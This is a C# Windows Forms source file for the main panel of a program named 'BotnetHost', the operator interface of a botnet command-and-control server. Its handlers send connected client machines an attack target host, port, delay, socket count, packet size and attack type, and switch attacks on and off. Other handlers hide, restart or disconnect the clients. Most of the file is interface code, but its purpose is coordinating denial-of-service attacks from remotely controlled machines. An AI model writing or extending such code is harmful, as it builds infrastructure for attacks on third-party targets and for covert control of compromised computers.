using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.NetworkInformation;

namespace BotnetHost
{
    public partial class MainPanel : MetroFramework.Forms.MetroForm
    {
        Utilities utilities;

        /// <summary>
        /// MainPanel Function, this is the constuctor for the window
        /// </summary>
        public MainPanel()
        {
            // Initialize
            InitializeComponent();
            utilities = new Utilities(clientListView, logListView);
            // Set UI stuff
            clientColumn.Width = clientListView.Width - 5;
            logColumn.Width = logListView.Width - 5;
            serverIPLabel.Text = "IP: " + utilities.serverIP;
            serverIPV4Label.Text = "IPV4: " + utilities.serverIPV4;
            serverPortLabel.Text = "Port: " + utilities.serverPort;
            // Start Server
            utilities.runServer = true;
            utilities.startServer();
        }

        /// <summary>
        /// Catch-All for settings updates, causes server to send all clients updated settings
        /// </summary>
        /// <param name="sender">This is the control that sent the command</param>
        /// <param name="e">This is the event argument</param>
        public void settingsChanged(object sender, EventArgs e)
        {
            // Loop through client connections and apply settings
            foreach (ClientConnection clientConnection in utilities.GetClientConnections().ToList<ClientConnection>())
            {
                clientConnection.hostOrIP = metroTextBox1.Text;
                clientConnection.port = int.Parse(metroTextBox2.Text);
                clientConnection.delay = delayTrackBar.Value;
                clientConnection.sockets = socketsTrackBar.Value;
                clientConnection.packetSize = packetSizeTrackBar.Value;
                clientConnection.attack = attackingToggle.Checked;
                if (attackTypeComboBox.Text == "")
                {
                    clientConnection.type = attackTypeComboBox.PromptText;
                } else if (attackTypeComboBox.Text != "")
                {
                    clientConnection.type = attackTypeComboBox.Text;
                }
                if (!clientConnection.restart)
                {
                    clientConnection.restart = utilities.restartClients;
                }
                clientConnection.hasUpdate = true;
                clientConnection.hidden = utilities.hideClients;
            }
        }

        /// <summary>
        /// Updates labels associated with track bars
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void updateTrackBars(object sender, EventArgs e)
        {
            delayLabel.Text = delayTrackBar.Value.ToString();
            socketsLabel.Text = socketsTrackBar.Value.ToString();
            packetSizeLabel.Text = packetSizeTrackBar.Value.ToString();
        }

        /// <summary>
        /// Toggle box for starting/stopping the server
        /// </summary>
        /// <param name="sender">The button</param>
        /// <param name="e">event args</param>
        private void serverToggle_CheckedChanged(object sender, EventArgs e)
        {
            if (serverToggle.Checked)
            {
                utilities.startServer();
            }
            else
            {
                utilities.stopServer();
            }
        }

        /// <summary>
        /// Closing Procedure, cleans up all connections/threads/sockets
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Kill all client connections
            foreach (ClientConnection connection in utilities.GetClientConnections().ToList<ClientConnection>())
            {
                connection.killClient();
            }
            // Shutdown & Close Server Socket
            try
            {
                utilities.serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception er) { }
            try
            {
                utilities.serverSocket.Close();
            }
            catch (Exception er) { }
            // Abort main thread
            try
            {
                utilities.mainServerThread.Abort();
            }
            catch (Exception er) { }
        }

        /// <summary>
        /// Restart client button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void restartClientsBtn_Click(object sender, EventArgs e)
        {
            utilities.restartClients = true;
            settingsChanged(sender, e);
            utilities.GetClientConnections().ToList<ClientConnection>().Clear();
            utilities.updateClientPanel();
            utilities.restartClients = false;
        }

        /// <summary>
        /// Click log context menu item resulting in message box displaying full message (usefull if errors get cutoff)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void viewLogMenuItem_Click(object sender, EventArgs e)
        {
            if (logListView.SelectedItems[0] != null)
            {
                MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
            }
        }

        /// <summary>
        /// MouseDown event for log listview
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void activityLogListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var focusedItem = logListView.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    logContextMenu.Show(Cursor.Position);
                }
            }
        }

        /// <summary>
        /// Disconnect the selected client from the Host-Server
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;

                foreach (ClientConnection connection in utilities.GetClientConnections().ToList<ClientConnection>())
                {
                    if (connection.clientName == selectedClientName)
                    {
                        connection.killClient();
                    }
                }
            }
        }

        /// <summary>
        /// MouseDown catcher for client list view (used for cotext menu)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void clientListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var focusedItem = clientListView.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    clientContextMenu.Show(Cursor.Position);
                }
            }
        }

        /// <summary>
        /// Restart the selected client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;

                foreach (ClientConnection connection in utilities.GetClientConnections().ToList<ClientConnection>())
                {
                    if (connection.clientName == selectedClientName)
                    {
                        connection.restart = true;
                        connection.hasUpdate = true;
                        settingsChanged(sender, e);
                        utilities.updateClientPanel();
                    }
                }
            }
        }

        /// <summary>
        /// Toggle Visible/Hidden for all clients
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void hideClientsBtn_Click(object sender, EventArgs e)
        {
            if (hideClientsBtn.Text == "Hide Clients")
            {
                utilities.hideClients = true;
                settingsChanged(sender, e);
                hideClientsBtn.Text = "Show Clients";
            } else if (hideClientsBtn.Text == "Show Clients")
            {
                utilities.hideClients = false;
                settingsChanged(sender, e);
                hideClientsBtn.Text = "Hide Clients";
            }
        }

        /// <summary>
        /// Toggle Visible/Hidden for the selected client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;
                try
                {
                    // remove ' [Hidden]' from selected client text (otherwise client will not be found in foreach loop)
                    selectedClientName = selectedClientName.Replace(" [Hidden]", "");
                }
                catch (Exception er) { }

                foreach (ClientConnection connection in utilities.GetClientConnections().ToList<ClientConnection>())
                {
                    if (connection.clientName == selectedClientName)
                    {
                        if (connection.hidden)
                        {
                            utilities.log("Client is hidden");
                            connection.hidden = false;
                            connection.hasUpdate = true;
                            utilities.updateClientPanel();
                        } else
                        {
                            utilities.log("Client is visible");
                            connection.hidden = true;
                            connection.hasUpdate = true;
                            utilities.updateClientPanel();
                        }
                    }
                }
            }
        }
    }
}
